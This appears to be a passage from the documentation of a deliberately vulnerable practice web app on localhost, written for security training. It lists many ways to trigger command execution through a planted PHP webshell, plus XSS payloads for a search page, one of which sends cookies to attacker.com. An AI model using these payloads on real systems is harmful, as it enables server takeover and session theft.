# Diaco - Vulnerable Web Application

#### R. PHP Webshell
- **Location**: http://localhost:3300/webshell.php
- **CVE**: CVE-2021-41769
- **Vulnerability**: Multiple PHP webshell patterns
- **Exploitation**:
  ```
  # Basic command execution
  ?cmd=id
  ?cmd=whoami
  
  # Eval execution
  POST code=system('id');
  
  # System command execution
  ?exec=id
  
  # Shell execution
  ?shell=id
  
  # Windows command execution
  POST win_cmd=cmd.exe /c whoami
  
  # Base64 encoded execution
  ?b64=base64_encoded_command
  
  # Dynamic function call
  ?func=system&arg=id
  
  # Reflection based execution
  POST reflection=system&args=id
  
  # Hex encoded execution
  ?hex=id
  
  # Dynamic variable function call
  ?method=system&param=id
  
  # Cookie based execution
  Cookie: cmd=system
  
  # Request based execution
  ?action=system&param=id
  
  # Hidden command execution
  ?b4tm4n=id
  
  # Alternative shell execution
  ?cmdshell=id
  
  # PHP info disclosure
  ?info=1
  
  # Assert based execution
  POST assert=system('id')
  
  # Call user function execution
  ?call=system&args=id
  
  # Call user function array execution
  POST call_array=system&args[]=id
  
  # Combined execution methods
  ?combined=base64_encoded_command
  
  # File upload and execution
  POST file=@shell.php
  ```

#### S. Cross-Site Scripting in Search Functionality
- **Location**: http://localhost:3300/sell-media-search.php
- **CVE**: CVE-2019-6112
- **Vulnerability**: Cross-Site Scripting in search functionality
- **Description**: The search functionality contains a cross-site scripting vulnerability that allows remote attackers to inject arbitrary web script or HTML via the keyword parameter.
- **Impact**: Successful exploitation could allow an attacker to execute malicious scripts in the context of a victim's browser, potentially leading to session hijacking, defacement, or theft of sensitive information.
- **Exploitation**:
  ```
  # Basic XSS
  ?keyword="><script>alert(1337)</script>
  
  # Stored XSS
  ?keyword=<img src=x onerror=alert(document.cookie)>
  
  # DOM-based XSS
  ?keyword=" onmouseover="alert(1)
  
  # Persistent XSS
  ?keyword=<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>
  ```

## Security Testing Scenarios

7. **Webshell Testing**:
   - Test various command execution methods
   - Try different encoding techniques
   - Test file upload functionality
   - Attempt PHP info disclosure
   - Test reflection-based execution
   - Try cookie-based command execution
   - Test combined execution methods 

8. **Search XSS Testing**:
   - Test for reflected XSS in search results
   - Test for stored XSS in search history
   - Test for DOM-based XSS in search form
   - Test for persistent XSS in search results
   - Test for XSS in search term display
   - Test for XSS in error messages
   - Test for XSS in search suggestions 